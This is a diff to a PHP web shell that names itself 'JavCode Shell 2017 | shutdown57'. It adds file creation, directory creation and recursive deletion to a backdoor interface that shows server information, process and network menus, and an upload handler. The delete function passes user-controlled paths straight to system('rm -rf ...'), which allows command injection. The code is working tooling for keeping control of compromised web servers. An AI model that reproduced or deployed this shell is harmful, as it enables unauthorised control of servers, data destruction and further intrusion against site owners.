@@ -249,7 +249,28 @@ Class J_fileman{
 	{
 		$a_fdm=@date("Y-m-d H:i:s",filemtime($f));return $a_fdm;
 	}
-
+	public function r($dmn)
+	{
+		echo "<meta http-equiv='refresh' content='0;url=".$dmn."'>";
+	}
+	public function j_touch($filepath)
+	{
+		if(function_exists('touch'))
+		{
+			return touch($filepath);
+		}elseif(function_exists('fopen') && function_exists('fwrite'))
+		{
+			$fp = fopen($filepath,'w');
+			return fwrite($fp,'# JavCode Shell 2017 | shutdown57');
+			fclose($fp);
+		}else{
+			return file_put_contents($filepath,'# JavCode Shell 2017 | shutdown57');
+		}
+	}
+	public function j_mkdir($filepath){
+		return mkdir($filepath);
+	}
+	public function delete($dir){if(is_dir($dir)){if(!rmdir($dir)){$s=scandir($dir);foreach($s as $ss){if(is_file($dir."/".$ss)){if(unlink($dir."/".$ss)){$rm=rmdir($dir);}}if(is_dir($dir."/".$ss)){$rm=rmdir($dir."/".$ss);$rm.=rmdir($dir);$rm.=system('rm -rf '.$dir);}}}}elseif(is_file($dir)){$rm=unlink($dir);if(!$rm){system('rm -rf '.$dir);}}return $rm;}
 }
 
 
@@ -279,7 +300,18 @@ function j_check(source) {
   {
   	document.getElementsById(close).style.display='none';
   }
-
+  function j_jsfile(){
+  	var j=prompt('Newfile :<?=$getdir; ?>');
+  	if(j != null){
+  	window.location.href='?j=<?=$j_film->Fz($getdir);?>&n='+j+'&a=touch';
+    }
+  }
+  function j_jsdir(){
+  	var j=prompt('New Directory : <?=$getdir;?>');
+  	if(j != null){
+  		window.location.href='?j=<?=$j_film->Fz($getdir);?>&n='+j+'&a=mkdir';
+  	}
+  }
 </script>
 <?php
 $serverinfo = array('System :' => php_uname().'<br>',
@@ -304,6 +336,7 @@ $menu = array('Home' => '?',
 			 'PS' => '?a=ps',
 			 'String' => '?a=str',
 			 'Network' => '?a=net',
+			 'NewFile' => 'javascript:j_jsfile();',
 			 'LogOut' => '?a=logOUT'
 			  );
 foreach($menu as $m => $l)
@@ -324,7 +357,8 @@ if(isset($_FILES['fupload']['tmp_name']))
 if(empty($_GET['a'])){
 
 $j_html->j_print($j_html->table(array('No','-','Files','Size','Type','Date Modif','Owner:Group','Permission','Actions')));
-$j_html->j_print($j_html->tr($j_html->td('*').$j_html->td($j_html->input('checkbox','files','',array('onclick' => 'j_check(this);'))).$j_html->td($j_film->j_link(array('?j=',dirname($getdir),'','','','','<< Parent Directory'))).$j_html->td('').$j_html->td('').$j_html->td('').$j_html->td('').$j_html->td('').$j_html->td('')));
+$act1=array("javascript:j_jsfile();"=>"new file","javascript:j_jsdir();"=>"new dir");
+$j_html->j_print($j_html->tr($j_html->td('*').$j_html->td($j_html->input('checkbox','files','',array('onclick' => 'j_check(this);'))).$j_html->td($j_film->j_link(array('?j=',dirname($getdir),'','','','','<< Parent Directory'))).$j_html->td('').$j_html->td('').$j_html->td('').$j_html->td('').$j_html->td('').$j_html->td($j_html->j_act($act1))));
 foreach($scndir as $dir)
 {if(!is_dir($getdir.'/'.$dir)|| $dir == '.'||$dir == '..')continue;
 $ll = '?j='.$j_film->Fz($getdir.'/'.$dir).'&a=';
@@ -367,5 +401,25 @@ if($a == 'view')
 }elseif($a == 'logOUT'){
 		session_destroy();
 	$j_html->j_print("<script>alert('Bye ~~');location.href='?'</script>");
+}elseif($a == 'touch'){
+	if($j_film->j_touch($j_film->Fz($j,$GLOBALS['j_encrypted']).'/'.$_GET['n'])){
+		$j_film->r('?j='.$j);
+	}else{
+		$j_film->r('?j='.$j);
+	}
+}elseif($a == 'mkdir'){
+	if($j_film->j_mkdir($j_film->Fz($j,$GLOBALS['j_encrypted']).'/'.$_GET['n'])){
+		$j_film->r('?j='.$j);
+	}else{
+		$j_film->r('?j='.$j);
+	}
+}elseif($a == 'del'){
+	$deletef = (!empty($f)) ? $j_film->Fz($j,$GLOBALS['j_encrypted']).'/'.$j_film->Fz($f,$GLOBALS['j_encrypted']) : $j_film->Fz($j,$GLOBALS['j_encrypted']);
+	if($j_film->delete($deletef))
+	{
+		$j_film->r('?j='.$j);
+	}else{
+		$j_film->r('?j='.$j);
+	}
 }
 }
